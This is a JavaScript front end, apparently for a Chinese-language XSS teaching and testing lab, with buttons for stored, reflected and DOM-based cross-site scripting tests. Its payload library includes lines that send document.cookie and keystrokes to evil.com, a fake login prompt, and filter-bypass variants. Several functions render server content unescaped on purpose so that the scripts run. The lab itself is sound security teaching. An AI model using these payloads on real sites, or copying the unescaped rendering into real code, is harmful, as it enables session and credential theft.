/**
 * XSS漏洞测试平台JavaScript逻辑
 * 实现存储型、反射型、DOM型XSS测试功能
 */

// 全局配置
const XSS_CONFIG = {
    ENDPOINTS: {
        STORAGE_SUBMIT: '/target/xss/submit-comment',
        STORAGE_SAFE_SUBMIT: '/target/xss/safe-submit-comment',
        STORAGE_LIST: '/target/xss/list-comments',
        REFLECTIVE_SEARCH: '/target/xss/search',
        DOM_PROFILE: '/target/xss/profile'
    },
    SELECTORS: {
        COMMENT_INPUT: '#commentInput',
        SEARCH_KEYWORD: '#searchKeyword',
        USERNAME_INPUT: '#usernameInput',
        VULN_COMMENT_BTN: '#vulnCommentBtn',
        SAFE_COMMENT_BTN: '#safeCommentBtn',
        VIEW_COMMENTS_BTN: '#viewCommentsBtn',
        REFLECTIVE_SEARCH_BTN: '#reflectiveSearchBtn',
        DOM_PROFILE_BTN: '#domProfileBtn',
        OUTPUT_CONTAINER: '#outputContainer',
        STATUS_INDICATOR: '#statusIndicator',
        LOADING_OVERLAY: '#loadingOverlay'
    }
};

// XSS测试用例库
const XSS_TEST_CASES = {
    storage: {
        basic: "<script>alert('存储型XSS触发')</script>",
        cookie: "<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>",
        phishing: "<script>alert('会话过期，请重新登录：'+prompt('用户名：')+prompt('密码：'))</script>",
        img: "<img src=x onerror=alert('img标签XSS')>",
        domain: "<script>alert(document.domain)</script>",
        pageHijack: "<script>document.body.innerHTML='<h1>页面被XSS劫持！</h1>'</script>",
        keylogger: "<script>document.onkeydown=function(e){new Image().src='http://evil.com/key?k='+e.key}</script>",
        svg: "<svg onload=alert('svg标签XSS')>"
    },
    reflective: {
        basic: "<script>alert('反射型XSS')</script>",
        cookie: "<script>location.href='http://evil.com?c='+document.cookie</script>",
        bypass: "</div><script>alert('闭合标签绕过')</script>",
        mixedCase: "<ScRiPt>alert('大小写混合')</ScRiPt>",
        commentBypass: "<script>alert/*注释*/('注释绕过')</script>",
        showKeyword: "<script>alert('你搜索的是：'+location.href.split('keyword=')[1])</script>"
    },
    dom: {
        basic: "</p><script>alert('DOM型XSS')</script>",
        img: "<img src=x onerror=alert('DOM-img')>",
        input: "<input autofocus onfocus=alert('DOM-focus')>",
        svg: "<svg onload=alert('DOM-svg')>",
        link: "<a href=\"javascript:alert('DOM-link')\">点我</a>",
        iframe: "<iframe src=\"javascript:alert('DOM-iframe')\"></iframe>"
    }
};

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

/**
 * 应用初始化函数
 */
function initializeApp() {
    bindEventListeners();
    updateStatus('ready', '就绪');
    console.log('XSS漏洞测试平台初始化完成');
}

/**
 * 绑定事件监听器
 */
function bindEventListeners() {
    // 存储型XSS按钮
    document.querySelector(XSS_CONFIG.SELECTORS.VULN_COMMENT_BTN)
        ?.addEventListener('click', () => executeStorageXss('vuln'));
        
    document.querySelector(XSS_CONFIG.SELECTORS.SAFE_COMMENT_BTN)
        ?.addEventListener('click', () => executeStorageXss('safe'));
        
    document.querySelector(XSS_CONFIG.SELECTORS.VIEW_COMMENTS_BTN)
        ?.addEventListener('click', viewComments);

    // 反射型XSS按钮
    document.querySelector(XSS_CONFIG.SELECTORS.REFLECTIVE_SEARCH_BTN)
        ?.addEventListener('click', executeReflectiveXss);

    // DOM型XSS按钮
    document.querySelector(XSS_CONFIG.SELECTORS.DOM_PROFILE_BTN)
        ?.addEventListener('click', executeDomXss);

    // 回车键执行
    document.querySelector(XSS_CONFIG.SELECTORS.COMMENT_INPUT)
        ?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && e.ctrlKey) executeStorageXss('vuln');
        });
        
    document.querySelector(XSS_CONFIG.SELECTORS.SEARCH_KEYWORD)
        ?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeReflectiveXss();
        });
        
    document.querySelector(XSS_CONFIG.SELECTORS.USERNAME_INPUT)
        ?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeDomXss();
        });

    // 输出容器自动滚动
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (outputContainer) {
        new MutationObserver(() => {
            outputContainer.scrollTop = outputContainer.scrollHeight;
        }).observe(outputContainer, { childList: true, subtree: true });
    }
}

/**
 * 执行存储型XSS测试
 * @param {'vuln'|'safe'} testType 测试类型
 */
async function executeStorageXss(testType) {
    const commentInput = document.querySelector(XSS_CONFIG.SELECTORS.COMMENT_INPUT);
    const commentContent = commentInput?.value.trim();

    if (!commentContent) {
        showNotification('请输入评论内容', 'warning');
        commentInput?.focus();
        return;
    }

    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '提交中...');

    try {
        const endpoint = testType === 'vuln' 
            ? XSS_CONFIG.ENDPOINTS.STORAGE_SUBMIT 
            : XSS_CONFIG.ENDPOINTS.STORAGE_SAFE_SUBMIT;
            
        const response = await sendPostRequest(endpoint, { content: commentContent });
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        handleStorageResponse(commentContent, response, testType, responseTime);
        showNotification(`${testType === 'vuln' ? '恶意' : '安全'}评论提交成功`, 'success');
        
    } catch (error) {
        console.error('存储型XSS测试错误:', error);
        showNotification(`提交失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 查看评论列表（触发存储型XSS）
 */
async function viewComments() {
    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '加载中...');

    try {
        const response = await sendGetRequest(XSS_CONFIG.ENDPOINTS.STORAGE_LIST);
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        displayComments(response, responseTime);
        showNotification('评论列表加载成功', 'success');
        
        // 模拟XSS触发效果
        simulateXssTrigger(response);
        
    } catch (error) {
        console.error('查看评论错误:', error);
        showNotification(`加载失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 执行反射型XSS测试
 */
async function executeReflectiveXss() {
    const keywordInput = document.querySelector(XSS_CONFIG.SELECTORS.SEARCH_KEYWORD);
    const keyword = keywordInput?.value.trim();

    if (!keyword) {
        showNotification('请输入搜索关键词', 'warning');
        keywordInput?.focus();
        return;
    }

    const encodedKeyword = encodeURIComponent(keyword);
    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '搜索中...');

    try {
        const response = await sendGetRequest(
            `${XSS_CONFIG.ENDPOINTS.REFLECTIVE_SEARCH}?keyword=${encodedKeyword}`
        );
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        handleReflectiveResponse(keyword, response, responseTime);
        showNotification('反射搜索完成', 'success');
        
    } catch (error) {
        console.error('反射型XSS测试错误:', error);
        showNotification(`搜索失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 执行DOM型XSS测试
 */
async function executeDomXss() {
    const usernameInput = document.querySelector(XSS_CONFIG.SELECTORS.USERNAME_INPUT);
    const username = usernameInput?.value.trim();

    if (!username) {
        showNotification('请输入用户名', 'warning');
        usernameInput?.focus();
        return;
    }

    // 对用户名进行双重编码以避免JSON解析错误
    const encodedUsername = encodeURIComponent(encodeURIComponent(username));
    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '加载中...');

    try {
        const response = await sendGetRequest(
            `${XSS_CONFIG.ENDPOINTS.DOM_PROFILE}?username=${encodedUsername}`
        );
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        handleDomResponse(username, response, responseTime);
        showNotification('用户资料加载成功', 'success');
        
    } catch (error) {
        console.error('DOM型XSS测试错误:', error);
        showNotification(`加载失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 发送POST请求
 * @param {string} url 请求URL
 * @param {Object} data 请求数据
 * @returns {Promise<Object>} 响应数据
 */
async function sendPostRequest(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data),
        credentials: 'same-origin'
    });

    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    return await response.json();
}

/**
 * 发送GET请求
 * @param {string} url 请求URL
 * @returns {Promise<Object>} 响应数据
 */
async function sendGetRequest(url) {
    const response = await fetch(url, {
        method: 'GET',
        headers: {
            'Accept': 'application/json'
        },
        credentials: 'same-origin'
    });

    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    return await response.json();
}

/**
 * 处理存储型XSS响应
 */
function handleStorageResponse(content, response, testType, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    const resultHtml = `
        <div class="query-result">
            <div class="query-header">
                <div>
                    <span class="query-type ${testType === 'vuln' ? 'vuln' : 'safe'}">
                        ${testType === 'vuln' ? '存储型XSS' : '安全防护'}
                    </span>
                    <span class="ms-2">测试类型: ${testType === 'vuln' ? '漏洞测试' : '防护测试'}</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="query-input">
                <i class="fas fa-comment me-2"></i>提交内容: ${escapeHtml(content)}
            </div>
            <div class="search-response">
                <strong>服务器响应:</strong><br>
                ${JSON.stringify(response, null, 2)}
            </div>
            ${testType === 'vuln' ? 
                `<div class="xss-warning">
                    <i class="fas fa-exclamation-triangle me-2"></i>
                    <strong>安全警告:</strong> 恶意内容已存入数据库，所有查看评论的用户都将触发XSS攻击！
                </div>` : 
                `<div class="security-success">
                    <i class="fas fa-shield-alt me-2"></i>
                    <strong>安全防护:</strong> 内容已进行HTML转义处理，有效防护存储型XSS攻击
                </div>`
            }
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);
}

/**
 * 显示评论列表
 */
function displayComments(response, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    let commentsHtml = '';
    let xssEffects = [];
    
    if (response.data && response.data.comment_list) {
        commentsHtml = response.data.comment_list.map((comment, index) => {
            const isXss = isXssContent(comment.content);
            if (isXss) {
                // 记录不同类型的XSS效果
                const effectType = getXssEffectType(comment.content);
                xssEffects.push({type: effectType, content: comment.content, index: index});
            }
            
            return `
            <div class="comment-item">
                <div class="comment-header">
                    <span class="comment-user">${escapeHtml(comment.user || '匿名用户')}</span>
                    <span class="comment-time">${new Date(parseInt(comment.create_time)).toLocaleString('zh-CN')}</span>
                </div>
                <div class="comment-content ${isXss ? 'xss-trigger' : ''}" data-comment-index="${index}">
                    ${isXss ? comment.content : escapeHtml(comment.content)}
                </div>
            </div>
        `}).join('');
    }

    const resultHtml = `
        <div class="query-result">
            <div class="query-header">
                <div>
                    <span class="query-type vuln">存储型XSS</span>
                    <span class="ms-2">评论列表展示</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="comment-list">
                <h6><i class="fas fa-comments me-2"></i>评论列表 (${response.data?.comment_list?.length || 0} 条):</h6>
                ${commentsHtml || '<div class="alert alert-info">暂无评论</div>'}
            </div>
            <div class="xss-warning">
                <i class="fas fa-exclamation-triangle me-2"></i>
                <strong>⚠️ 存储型XSS风险:</strong> 如上所示，数据库中的恶意脚本将在页面渲染时执行！
            </div>
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);
    
    // 为不同类型的XSS内容显示不同的效果
    if (xssEffects.length > 0) {
        setTimeout(() => {
            xssEffects.forEach((effect, idx) => {
                setTimeout(() => {
                    simulateSpecificXssEffect(effect.type, effect.index);
                }, idx * 1500); // 间隔1.5秒显示不同效果
            });
        }, 1000);
    }
}

/**
 * 处理反射型XSS响应
 */
function handleReflectiveResponse(keyword, response, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    // 更安全的关键词显示方式
    const safeKeyword = escapeHtml(keyword).replace(/\n/g, '\n').replace(/\r/g, '\r');
    
    // 检查响应中是否包含XSS脚本并准备执行
    let xssScript = '';
    if (response.data && response.data.tip) {
        // 从响应的tip字段中提取可能的XSS脚本
        const tipContent = response.data.tip;
        if (tipContent.includes('<script>') || tipContent.includes('onerror') || tipContent.includes('onload')) {
            xssScript = tipContent;
        }
    }
    
    const resultHtml = `
        <div class="query-result" id="reflective-result-${Date.now()}">
            <div class="query-header">
                <div>
                    <span class="query-type reflective">反射型XSS</span>
                    <span class="ms-2">搜索测试</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="search-keyword">
                <i class="fas fa-search me-2"></i>搜索关键词: <span class="keyword-display">${safeKeyword}</span>
            </div>
            <div class="search-response">
                <strong>服务器响应:</strong><br>
                <pre>${JSON.stringify(response, null, 2)}</pre>
            </div>
            ${xssScript ? `
            <div class="xss-demo-area" style="margin-top: 15px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 4px;">
                <strong>🔄 XSS执行演示区:</strong><br>
                <div id="xss-demo-content-${Date.now()}">${xssScript}</div>
            </div>` : ''}
            <div class="xss-warning">
                <i class="fas fa-bolt me-2"></i>
                <strong>⚠️ 反射型XSS风险:</strong> URL参数未经转义直接返回，可在响应中触发XSS攻击！
            </div>
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);
    
    // 如果有XSS脚本，延时执行以确保DOM已渲染
    if (xssScript) {
        setTimeout(() => {
            try {
                // 创建临时div来执行脚本
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = xssScript;
                document.body.appendChild(tempDiv);
                
                // 移除临时元素
                setTimeout(() => {
                    if (tempDiv.parentElement) {
                        tempDiv.remove();
                    }
                }, 100);
                
                // 显示执行提示
                showNotification('反射型XSS脚本已执行！', 'warning');
            } catch (e) {
                console.log('XSS脚本执行(模拟):', e.message);
            }
        }, 1000);
    }
}

/**
 * 处理DOM型XSS响应
 */
function handleDomResponse(username, response, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    const profileHtml = response.data?.html || `<div class="profile"><h3>用户资料</h3><p>用户名：${escapeHtml(username)}</p></div>`;
    const isXssTrigger = isXssContent(profileHtml);
    const resultId = `dom-result-${Date.now()}`;

    const resultHtml = `
        <div class="query-result" id="${resultId}">
            <div class="query-header">
                <div>
                    <span class="query-type dom">DOM型XSS</span>
                    <span class="ms-2">用户资料</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="profile-container">
                <div class="profile-header">
                    <h4><i class="fas fa-user-circle me-2"></i>用户资料</h4>
                </div>
                <div class="profile-content ${isXssTrigger ? 'xss-trigger' : ''}" id="profile-content-${resultId}">
                    ${profileHtml}
                </div>
            </div>
            <div class="xss-warning">
                <i class="fas fa-code me-2"></i>
                <strong>⚠️ DOM型XSS风险:</strong> 后端返回的HTML片段在前端渲染时可能执行恶意脚本！
            </div>
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);

    // 如果检测到XSS内容，实际执行脚本来触发效果
    if (isXssTrigger) {
        setTimeout(() => {
            try {
                // 获取刚插入的profile内容区域
                const profileContent = document.getElementById(`profile-content-${resultId}`);
                if (profileContent) {
                    // 创建临时容器执行脚本
                    const tempContainer = document.createElement('div');
                    tempContainer.innerHTML = profileHtml;
                    document.body.appendChild(tempContainer);
                    
                    // 立即移除以避免重复执行
                    setTimeout(() => {
                        if (tempContainer.parentElement) {
                            tempContainer.remove();
                        }
                    }, 50);
                }
                
                // 显示执行提示
                showNotification('DOM型XSS脚本已执行！', 'warning');
            } catch (e) {
                console.log('DOM XSS脚本执行(模拟):', e.message);
                // 即使执行失败也显示模拟效果
                simulateXssEffect('DOM型XSS攻击触发！');
            }
        }, 800);
    }
}

/**
 * 检测是否为XSS内容
 * @param {string} content 内容
 * @returns {boolean} 是否包含XSS特征
 */
function isXssContent(content) {
    if (!content) return false;
    
    const xssPatterns = [
        /<script[^>]*>.*?<\/script>/gi,
        /on\w+\s*=/gi,
        /javascript:/gi,
        /<img[^>]*\s+onerror\s*=/gi,
        /<svg[^>]*\s+onload\s*=/gi,
        /<iframe[^>]*\s+src\s*=\s*["']javascript:/gi
    ];
    
    return xssPatterns.some(pattern => pattern.test(content));
}

/**
 * 获取XSS效果类型
 * @param {string} content XSS内容
 * @returns {string} 效果类型
 */
function getXssEffectType(content) {
    if (!content) return 'basic';
    
    if (content.includes('alert') && content.includes('document.cookie')) {
        return 'cookie';
    } else if (content.includes('prompt') && content.includes('登录')) {
        return 'phishing';
    } else if (content.includes('<img') && content.includes('onerror')) {
        return 'img';
    } else if (content.includes('<svg') && content.includes('onload')) {
        return 'svg';
    } else if (content.includes('document.body.innerHTML')) {
        return 'pageHijack';
    } else {
        return 'basic';
    }
}

/**
 * 模拟XSS触发效果
 */
function simulateXssTrigger(response) {
    if (response.data?.comment_list) {
        const hasXss = response.data.comment_list.some(comment => 
            isXssContent(comment.content)
        );
        
        if (hasXss) {
            setTimeout(() => {
                simulateXssEffect('存储型XSS攻击触发！');
            }, 1000);
        }
    }
}

/**
 * 模拟XSS弹窗效果
 * @param {string} message 提示信息
 */
function simulateXssEffect(message) {
    const effectDiv = document.createElement('div');
    effectDiv.className = 'xss-effect show';
    effectDiv.innerHTML = `
        <div class="xss-effect-content">
            <i class="fas fa-exclamation-triangle fa-3x mb-3"></i>
            <h3>XSS攻击演示</h3>
            <p>${escapeHtml(message)}</p>
            <p style="font-size: 16px; margin-top: 20px;">
                <strong>实际环境中这将是真实的恶意脚本执行！</strong>
            </p>
            <button class="btn btn-light mt-3" onclick="this.parentElement.parentElement.remove()">
                <i class="fas fa-times me-2"></i>关闭演示
            </button>
        </div>
    `;
    
    document.body.appendChild(effectDiv);
    
    // 5秒后自动关闭
    setTimeout(() => {
        if (effectDiv.parentElement) {
            effectDiv.remove();
        }
    }, 5000);
}

/**
 * 模拟特定类型的XSS效果
 * @param {string} effectType 效果类型
 * @param {number} commentIndex 评论索引
 */
function simulateSpecificXssEffect(effectType, commentIndex) {
    const effectMessages = {
        'basic': '基础XSS弹窗攻击触发！',
        'cookie': 'Cookie窃取攻击模拟！(实际环境中会窃取用户凭证)',
        'phishing': '钓鱼攻击模拟！(实际环境中会诱导用户输入敏感信息)',
        'img': '图片标签XSS攻击触发！',
        'svg': 'SVG标签XSS攻击触发！',
        'pageHijack': '页面劫持攻击模拟！(实际环境中会完全控制页面内容)'
    };
    
    const message = effectMessages[effectType] || 'XSS攻击触发！';
    
    // 高亮对应的评论项
    const commentElement = document.querySelector(`[data-comment-index="${commentIndex}"]`);
    if (commentElement) {
        commentElement.style.animation = 'pulse 0.5s ease-in-out';
        setTimeout(() => {
            commentElement.style.animation = '';
        }, 500);
    }
    
    // 显示对应的效果
    const effectDiv = document.createElement('div');
    effectDiv.className = 'xss-effect show';
    effectDiv.innerHTML = `
        <div class="xss-effect-content" style="background: linear-gradient(135deg, #dc3545 0%, #bd2130 100%);">
            <i class="fas fa-exclamation-triangle fa-3x mb-3"></i>
            <h3>${effectType === 'basic' ? '基础' : effectType === 'cookie' ? 'Cookie窃取' : effectType === 'phishing' ? '钓鱼' : effectType === 'img' ? '图片标签' : effectType === 'svg' ? 'SVG标签' : '页面劫持'}XSS攻击</h3>
            <p>${escapeHtml(message)}</p>
            <p style="font-size: 14px; margin-top: 15px;">
                <strong>对应评论索引:</strong> #${commentIndex + 1}
            </p>
            <p style="font-size: 16px; margin-top: 20px;">
                <strong>实际环境中这将是真实的恶意脚本执行！</strong>
            </p>
            <button class="btn btn-light mt-3" onclick="this.parentElement.parentElement.remove()">
                <i class="fas fa-times me-2"></i>关闭演示
            </button>
        </div>
    `;
    
    document.body.appendChild(effectDiv);
    
    // 4秒后自动关闭
    setTimeout(() => {
        if (effectDiv.parentElement) {
            effectDiv.remove();
        }
    }, 4000);
}

/**
 * HTML转义函数
 * @param {string} text 要转义的文本
 * @returns {string} 转义后的文本
 */
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

/**
 * 加载XSS测试用例
 * @param {string} type 漏洞类型
 * @param {string} caseName 用例名称
 */
function loadXssTestCase(type, caseName) {
    const testCase = XSS_TEST_CASES[type]?.[caseName];
    if (!testCase) return;

    let targetInput;
    switch (type) {
        case 'storage':
            targetInput = document.querySelector(XSS_CONFIG.SELECTORS.COMMENT_INPUT);
            break;
        case 'reflective':
            targetInput = document.querySelector(XSS_CONFIG.SELECTORS.SEARCH_KEYWORD);
            break;
        case 'dom':
            targetInput = document.querySelector(XSS_CONFIG.SELECTORS.USERNAME_INPUT);
            break;
    }

    if (targetInput) {
        targetInput.value = testCase;
        targetInput.focus();
        showNotification(`已加载${getTypeLabel(type)}测试用例: ${caseName}`, 'info');
    }
}

/**
 * 获取类型标签
 */
function getTypeLabel(type) {
    const labels = {
        'storage': '存储型',
        'reflective': '反射型',
        'dom': 'DOM型'
    };
    return labels[type] || type;
}

/**
 * 清空输出
 */
function clearOutput() {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;
    
    outputContainer.innerHTML = `
        <div class="welcome-message p-4 text-center text-muted">
            <i class="fas fa-bug fa-3x mb-3"></i>
            <h4>测试结果已清空</h4>
            <p class="mb-0">请重新开始XSS漏洞测试</p>
        </div>
    `;
    showNotification('测试结果已清空', 'info');
}

/**
 * 更新状态指示器
 */
function updateStatus(status, text) {
    const indicator = document.querySelector(XSS_CONFIG.SELECTORS.STATUS_INDICATOR);
    if (indicator) {
        const statusClasses = {
            'executing': 'bg-warning status-executing',
            'ready': 'bg-secondary'
        };
        
        const icons = {
            'executing': '<i class="fas fa-circle-notch fa-spin"></i>',
            'ready': '<i class="fas fa-circle"></i>'
        };
        
        indicator.className = `badge ${statusClasses[status] || 'bg-secondary'}`;
        indicator.innerHTML = `${icons[status] || ''} ${text}`;
    }
}

/**
 * 显示/隐藏加载遮罩
 */
function showLoading(show) {
    const overlay = document.querySelector(XSS_CONFIG.SELECTORS.LOADING_OVERLAY);
    if (overlay) {
        overlay.classList.toggle('show', show);
    }
}

/**
 * 显示通知
 */
function showNotification(message, type = 'info') {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-banner fade show`;
    alertDiv.role = 'alert';
    alertDiv.innerHTML = `
        <i class="fas fa-${getNotificationIcon(type)} me-2"></i>
        ${escapeHtml(message)}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    Object.assign(alertDiv.style, {
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        zIndex: '10000',
        minWidth: '300px',
        textAlign: 'center'
    });
    
    document.body.appendChild(alertDiv);
    
    setTimeout(() => {
        if (alertDiv.parentNode) {
            alertDiv.remove();
        }
    }, 3000);
}

/**
 * 获取通知图标
 */
function getNotificationIcon(type) {
    const icons = {
        'success': 'check-circle',
        'error': 'exclamation-circle',
        'warning': 'exclamation-triangle',
        'info': 'info-circle'
    };
    return icons[type] || 'info-circle';
}

// 暴露全局函数
window.loadXssTestCase = loadXssTestCase;
window.clearOutput = clearOutput;